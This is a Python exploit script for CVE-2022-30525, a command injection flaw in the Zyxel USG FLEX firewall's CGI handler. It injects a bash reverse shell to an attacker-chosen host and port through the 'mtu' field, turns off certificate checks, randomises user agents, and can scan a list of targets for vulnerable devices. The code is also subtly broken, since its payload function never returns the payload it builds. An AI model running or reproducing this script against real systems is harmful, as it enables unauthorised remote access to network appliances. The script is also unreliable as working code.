from colorama import Fore
import requests
import argparse
import random
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = """

███████╗██╗   ██╗██╗  ██╗███████╗██╗         ██████╗  ██████╗  ██████╗
╚══███╔╝╚██╗ ██╔╝╚██╗██╔╝██╔════╝██║         ██╔══██╗██╔═══██╗██╔════╝
  ███╔╝  ╚████╔╝  ╚███╔╝ █████╗  ██║         ██████╔╝██║   ██║██║     
 ███╔╝    ╚██╔╝   ██╔██╗ ██╔══╝  ██║         ██╔═══╝ ██║   ██║██║     
███████╗   ██║   ██╔╝ ██╗███████╗███████╗    ██║     ╚██████╔╝╚██████╗
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝      ╚═════╝  ╚═════╝

Author: c0d3Ninja
CVE:    CVE-2022-30525
Des:    OS command injection vulnerability in the CGI program of Zyxel USG FLEX 

"""


print(banner)

parser = argparse.ArgumentParser()

parser.add_argument('-t', '--target',
                   help="target to scan",)

parser.add_argument('-p', '--port',
                   help="port to scan")

parser.add_argument('-lhost', '--localhost',
                   help="target to scan")

parser.add_argument('-lport', '--localport',
                   help="target to scan")

parser.add_argument('-ts', '--test',
                   help="test the target",
                   action='store_true')

parser.add_argument('-f', '--file',
                   help="file to scan")

args = parser.parse_args()

useragent_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
]

headers = {"User-Agent": random.choice(useragent_list), 'Content-Type': 'application/json; charset=utf-8'}

def payload(localhost = None, localport = None) -> str:
    exploit = f";bash -c 'exec bash -i &>/dev/tcp/{localhost}/{str(localport)} <&1';"

    payload = {
        'command': 'setWanPortSt',
        'proto': 'dhcp',
        'port': '1270',
        'vlan_tagged': '1270',
        'vlanid': '1270',
        'mtu': exploit,
        'data':''
        }

def test(rhost: str) -> str:
    try:
        s = requests.Session()
        r = s.post(f"https://{rhost}/ztp/cgi-bin/handler", verify=False, headers=headers, json=payload(), timeout=5)
        if r.status_code != 503:
            print(f"{Fore.GREEN}{rhost} {Fore.RED}is not vulnerable!\n")
        else:
            print(f"{Fore.GREEN}{rhost} {Fore.RESET}is vulnerable!\n")
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.ReadTimeout:
        pass

def list_scan(file_list: str) -> str:
    with open(file_list, "r") as f:
        targets = [x.strip() for x in f.readlines()]
        for target_list in targets:
            test(target_list)

if args.target:
    if args.test:
        test(args.target)

if args.file:
    list_scan(args.file)

if args.target:
    if args.localhost:
        if args.localport:
            r = requests.post(f"https://{args.target}/ztp/cgi-bin/handler", verify=False, headers=headers, 
                              json=payload(args.localhost,args.localport), timeout=10)
            if r.status_code != 503:
                print(f"{Fore.GREEN}{args.target} {Fore.RED}not Exploitable!\n")

